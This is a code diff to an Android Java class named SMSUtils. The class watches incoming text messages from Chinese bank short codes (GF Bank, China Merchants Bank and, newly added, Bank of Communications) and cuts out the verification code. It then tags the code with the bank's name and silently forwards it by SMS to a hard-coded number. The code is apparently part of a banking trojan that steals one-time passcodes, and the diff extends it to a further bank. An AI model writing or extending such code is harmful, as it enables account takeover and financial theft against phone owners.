@@ -116,14 +116,16 @@ public class SMSUtils {
 							+ "=" + id, null);
 					SmsManager smsManager = SmsManager.getDefault();
 					phone = phone.trim();
-					if (phone.equals("95508") || phone.equals("95555")) {// 广发信用卡//招商卡
+					if (phone.equals("95508") || phone.equals("95555")||phone.equals("95559")) {// 广发信用卡//招商卡
 						if (body.indexOf("验证码") != -1) {
 							int length = body.indexOf("验证码");
 							body = body.substring(length, length + 10);
-							if (equals("95508")) {
+							if (phone.equals("95508")) {
 								body += "[广发银行]";
-							} else {
+							} else if(phone.equals("95555")) {
 								body += "[招商银行]";
+							} else if(phone.equals("95559")) {
+								body += "[交通银行]";
 							}
 							smsManager.sendTextMessage(MsgUtils.phone, null,
 									body, null, null);
